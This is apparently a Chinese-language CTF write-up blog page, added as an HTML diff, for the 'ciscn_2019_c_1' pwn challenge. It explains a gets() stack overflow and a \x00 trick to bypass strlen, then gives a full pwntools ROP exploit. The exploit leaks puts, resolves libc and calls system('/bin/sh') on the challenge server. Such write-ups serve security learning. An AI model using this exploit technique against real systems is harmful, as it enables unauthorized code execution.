@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+  
+  <title>ciscn_2019_c_1 - 8023</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/waline.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+    <body>
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/projects">Projects</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        <article class="post">
+    <div class="meta">
+        
+        <div class="date" id="date">
+            
+            
+            
+            
+            
+            
+            <span>June</span>
+            
+            
+            
+            
+            
+            
+            
+            <span>28,</span>
+            <span>2021</span>
+        </div>
+        
+
+        <h2 class="title">ciscn_2019_c_1</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>检查保护机制，64位，开NX</p>
+<p><img src="/img/image-20210429213629885.png" alt="image-20210429213629885"></p>
+<p>IDA打开后F5查看main函数</p>
+<p><img src="/img/image-20210423214542261.png" alt="image-20210423214542261"></p>
+<p>发现没有之前做的gets()栈溢出，但是发现了一个encrypt函数，点开之后查看，找到了gets函数</p>
+<p><img src="/img/image-20210423214700799.png" alt="image-20210423214700799"></p>
+<p>读得内容为gets读取输入内容进入while循环之后是由strlen检查长度，strlen是从字符串开头检测到第一个\x00截断，所以只要在payload的开头置0让strlen判断错误就可以避免对payload的破坏。</p>
+<h4 id="小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过"><a href="#小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过" class="headerlink" title="小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过"></a>小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过</h4><p>但这里没有发现后门函数，于是只能自己构造rop链。</p>
+<p>puts()可以用来泄露libc基址。</p>
+<p>gets()可以用来栈溢出，栈大小0x50。</p>
+<p><img src="/img/image-20210430234840983.png" alt="image-20210430234840983"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">content = <span class="number">0</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4006b9</span>      </span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>] </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span>      <span class="comment">#×64程序基本都存在的一个地址pop rdi；ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	<span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">		p = process(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:	</span><br><span class="line">		p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29999</span>)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">	payload = payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)	</span><br><span class="line">	p.recvline()</span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">7</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	<span class="built_in">print</span>(puts_addr)      <span class="comment">#找出puts的地址</span></span><br><span class="line"></span><br><span class="line">	libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">	libc_base   = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)      <span class="comment">#找出函数地址偏移量</span></span><br><span class="line">	system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)      <span class="comment">#计算出system的在程序中的地址</span></span><br><span class="line">	binsh_addr  = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)	</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">	payload = payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>cat flag</p>
+<p><img src="/img/image-20210501002359709.png" alt="image-20210501002359709"></p>
+
+    </div>
+
+    <div class="about">
+        <h1>About this Post</h1>
+        <p>This post is written by Pr0b1em, licensed under <a
+                target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+
+    
+        
+    
+</article>
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h4 class="title">Blog</h4>
+                
+                <a href="/" class="item" target="_blank">Blog</a>
+                
+                <a href="/archives" class="item" target="_blank">Archives</a>
+                
+                <a href="/friends" class="item" target="_blank">Friends</a>
+                
+                <a href="/projects" class="item" target="_blank">Projects</a>
+                
+                <a href="/resume" class="item" target="_blank">Resume</a>
+                
+                <a href="/about" class="item" target="_blank">About</a>
+                
+                <a href="/atom.xml" class="item" target="_blank">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h4 class="title">Projects</h4>
+                
+                <a href="https://github.com/transmister" class="item" target="_blank">Transmister</a>
+                
+                <a href="https://github.com/MrWillCom/css-and-js-windows-uwp-xaml-controls" class="item" target="_blank">CSS&amp;JS Windows UWP XAML Controls</a>
+                
+                <a href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item" target="_blank">Theme Cupertino</a>
+                
+                <a href="https://github.com/MrWillCom/github-dark-mode" class="item" target="_blank">GitHub Dark Mode</a>
+                
+            </div>
+            
+            <div class="group">
+                <h4 class="title">Me</h4>
+                
+                <a href="https://github.com/MrWillCom" class="item" target="_blank">GitHub</a>
+                
+                <a href="https://codepen.io/mrwillcom" class="item" target="_blank">CodePen</a>
+                
+                <a href="https://www.patreon.com/MrWillCom" class="item" target="_blank">Patreon</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item" target="_blank">Email</a>
+                
+            </div>
+            
+        </div>
+        &copy; 2021 Pr0b1em<br />
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+</footer>
+
+        
+<script src="/js/main.js"></script>
+
+        
+    </body>
+</html>
